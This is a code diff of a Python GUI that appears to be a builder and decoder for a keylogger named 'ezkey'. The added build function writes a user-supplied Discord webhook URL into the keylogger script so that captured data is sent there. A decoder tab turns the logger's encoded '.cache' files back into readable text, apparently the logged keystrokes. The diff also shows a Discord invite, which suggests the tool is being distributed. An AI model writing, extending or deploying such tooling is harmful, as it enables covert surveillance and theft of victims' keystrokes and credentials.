@@ -25,13 +25,38 @@ def convert_text(text):
             decoded_bytes = int(str(encoded_int)).to_bytes((int(encoded_int).bit_length() + 7) // 8, byteorder='big')
             decoded_string = decoded_bytes.decode()
 
-            string += f" {decoded_string} "
+            string += f" {decoded_string}"
     return string
 
-def _home():
-    ui.label("will be released soon stay patient lol")
-    ui.label(".gg/BptVd57QHr")
+def __makebuild(webh_url, max_len):
+    if webh_url == "":
+        return ui.notify(f"Please enter a webhook url!", timeout=30, progress=True, color="red", position="top-left")
     
+    ui.notify(f"Build is starting!", timeout=30, progress=True, color="orange", position="top-left")
+    
+    with open("ezkey.pyw", "r") as f:
+        _ezkey = f.read()
+        
+    _ezkey = _ezkey.replace("discord_webhook = \"xpierroz on top\"", f"discord_webhook = \"{webh_url}\"")
+    _ezkey = _ezkey.replace(
+        "self.__max_len_file = 10", "self.__max_len_file = {}"
+        .format(max_len if max_len != "" else 10
+                )
+        )
+    
+    with open("ezkey.pyw", "w") as f:
+        f.write(_ezkey)
+        
+    ui.notify(f"Build has finished!", timeout=30, progress=True, color="green", position="top-left")
+
+def _home():
+    ui.label(".gg/BptVd57QHr").classes('text-center text-xl font-bold')
+    
+    with ui.column():
+        webh_url = ui.input(label='WebHook URL', placeholder='EZKey my g').props('inline color=orange-3').classes('w-full')
+        max_len = ui.input(label='MaxLines len (default 10)', placeholder='u should enter 10').props('inline color=orange-3').classes('w-full')
+        ui.button('Build', on_click=lambda: __makebuild(webh_url.value, max_len.value)).props("icon=build color=orange-3").classes('w-full')
+        
 def _translate(text):
     random_number = random.randint(0, 100000)
     name = f"translated_{random_number}.txt"
@@ -45,7 +70,6 @@ def translate(text):
     os.startfile(name)
     
 def _decoder():
-    ui.label("Open your .cache file")
     with ui.dialog().props('full-width') as dialog:
         with ui.card():
             content = ui.markdown()
@@ -55,8 +79,10 @@ def _decoder():
         _converted = convert_text(text)
         content.set_content(_converted)
         translate(_converted)
-        
-    ui.upload(on_upload=handle_upload, multiple=False, auto_upload=True).props('accept=.cache').classes('max-w-full')
+    with ui.column():
+        ui.label("Open your .cache file").classes('text-xl font-bold')
+        with ui.row():
+            ui.upload(on_upload=handle_upload, multiple=False, auto_upload=True).props('accept=.cache color=orange-3').classes('max-w-full centered')
 
 with ui.tabs().classes('w-full center') as tabs:
     ui.tab('Home', icon='home')
